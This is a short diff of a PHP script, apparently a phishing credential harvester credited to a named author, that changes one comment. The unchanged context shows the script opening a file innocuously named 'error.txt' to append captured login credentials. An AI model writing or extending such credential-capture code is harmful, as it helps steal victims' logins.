@@ -2,7 +2,7 @@
 //Twitter: @johntroony
 //Github: JohnTroony
 
-//open file to dump the captured login credentials
+//open file to dump (append) the captured login credentials
 $handle = fopen("error.txt", "a");
 
 //write captured login credentials to file
